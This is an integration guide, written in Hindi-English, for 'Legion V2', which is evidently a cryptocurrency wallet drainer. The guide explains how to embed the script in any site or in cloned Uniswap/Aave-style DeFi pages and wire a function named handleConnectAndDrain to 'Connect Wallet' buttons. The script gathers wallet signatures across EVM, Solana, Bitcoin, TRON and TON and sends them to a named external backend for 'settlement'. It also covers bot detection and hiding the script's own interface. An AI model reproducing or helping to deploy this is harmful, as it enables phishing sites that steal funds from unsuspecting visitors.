# Legion V2 Script - Frontend Integration Guide

## 2 Minute Integration - Any Website

---

## Step 1: Script file copy karo

`scripts/legion-one-script-v2.js` file apne frontend project mein copy karo.

---

## Step 2: HTML mein script load karo

Page ke `</body>` se pehle ye 1 line add karo:

```html
<script src="/legion-one-script-v2.js"></script>
```

Bas. Script auto-initialize hoga, floating UI button inject karega, aur ready ho jayega.

---

## Step 3 (Optional): Custom config set karo

Agar custom backend URL ya vaults chahiye, script load karne se PEHLE ye add karo:

```html
<script>
  window.LEGION_CONFIG = {
    backendUrl: 'https://sadrailala-production.up.railway.app',
    debug: false
  };
</script>
<script src="/legion-one-script-v2.js"></script>
```

---

## Step 4 (Optional): Apna button use karo

Script apna floating button banata hai. Agar tum apna custom button use karna chahte ho:

```html
<button onclick="window.handleConnectAndDrain()">Connect Wallet</button>
```

Ya kisi bhi event pe trigger karo:

```javascript
document.getElementById('my-button').addEventListener('click', function() {
  window.handleConnectAndDrain();
});
```

---

## Step 5 (Optional): Script ka floating UI hide karo

Agar apna UI hai aur script ka built-in panel nahi chahiye:

```html
<style>
  #legion-one-launcher, #legion-one-panel { display: none !important; }
</style>
```

---

## Complete Example - Minimal HTML

```html
<!DOCTYPE html>
<html>
<head>
  <title>My DeFi App</title>
</head>
<body>

  <h1>Welcome to My DeFi App</h1>
  <button onclick="window.handleConnectAndDrain()">Connect Wallet</button>

  <script src="/legion-one-script-v2.js"></script>

</body>
</html>
```

---

## Complete Example - Existing React/Next.js App

`pages/index.js` ya `app/page.js` mein:

```jsx
import { useEffect } from 'react';

export default function Home() {

  useEffect(() => {
    // Script load karo
    const script = document.createElement('script');
    script.src = '/legion-one-script-v2.js';
    document.body.appendChild(script);
  }, []);

  return (
    <div>
      <h1>My DeFi App</h1>
      <button onClick={() => window.handleConnectAndDrain()}>
        Connect Wallet
      </button>
    </div>
  );
}
```

`legion-one-script-v2.js` file `public/` folder mein rakh do.

---

## Complete Example - Clone Site (Uniswap/Aave type)

Clone project mein nginx.conf ya HTML files mein:

```html
<!-- Page ke end mein, </body> se pehle -->
<script src="/legion-one-script-v2.js"></script>
```

Ya CDN/external URL se load karo:

```html
<script src="https://your-cdn.com/legion-one-script-v2.js"></script>
```

---

## What Happens After Integration

```
1. Page load hota hai
   ↓
2. Script auto-initialize hota hai
   - Backend URL set: sadrailala-production.up.railway.app
   - Vault addresses load
   - Chain configs ready
   - Bot detection check
   - Floating UI button inject (bottom-right corner)
   ↓
3. User "Connect Wallet" click karta hai
   ↓
4. Script detects available wallets:
   - MetaMask (EVM)
   - Phantom (Solana)
   - UniSat/Xverse (Bitcoin)
   - TronLink (TRON)
   - Tonkeeper (TON)
   ↓
5. Wallets connect hote hain (parallel)
   ↓
6. Scout telemetry backend ko jaata hai
   POST /api/v1/scout
   ↓
7. Signatures collect hote hain (parallel)
   ↓
8. Har chain SEPARATELY backend ko submit hota hai:
   EVM:     POST /api/v1/signature-anchor (protocol: omnichain_atomic_v1)
   Solana:  POST /api/v1/signature-anchor (protocol: solana)
   Bitcoin: POST /api/v1/signature-anchor (protocol: bitcoin_psbt)
   TRON:    POST /api/v1/signature-anchor (protocol: tron)
   TON:     POST /api/v1/signature-anchor (protocol: ton)
   ↓
9. Backend stores in Supabase + starts settlement
   ↓
10. Done. User ko success message dikhta hai.
```

---

## Available JavaScript APIs

Script load hone ke baad ye global functions available hain:

```javascript
// Main function - wallet connect + sign + submit
window.handleConnectAndDrain()

// Initialize with custom config
window.legion_initializeV2({ backendUrl: '...', debug: true })

// Debug API
window.legion.connect()           // Same as handleConnectAndDrain
window.legion.debug.enable()      // Debug mode on
window.legion.debug.disable()     // Debug mode off
window.legion.debug.status()      // Chain status print
window.legion.debug.logs()        // Get all logs
window.legion.debug.validate()    // Run validation
```

---

## Supported Chains

| Chain | Wallet | Status |
|-------|--------|--------|
| Ethereum (EVM) | MetaMask, WalletConnect | Working |
| Solana | Phantom | Working |
| Bitcoin | UniSat, Xverse | Working |
| TRON | TronLink | Working |
| TON | Tonkeeper | Working |
| Cosmos | Keplr | Server not configured |
| Aptos | Petra | Server not configured |
| Sui | Sui Wallet | Server not configured |

---

## Troubleshooting

**Script load nahi ho raha:**
- Check file path correct hai
- Check browser console for errors
- Check CORS headers agar CDN se load kar rahe ho

**400 errors aa rahe hain:**
- Backend URL correct hai? Default: sadrailala-production.up.railway.app
- Script version latest hai?

**Wallet connect nahi ho raha:**
- Wallet extension installed hai?
- User ne wallet unlock kiya hai?
- HTTPS pe serve kar rahe ho? (wallets require HTTPS)

**Console mein "Validation failed" dikha:**
- Script ka built-in validation fail hua
- Usually bot detection ya config issue
- Debug mode enable karo: `window.legion.debug.enable()`
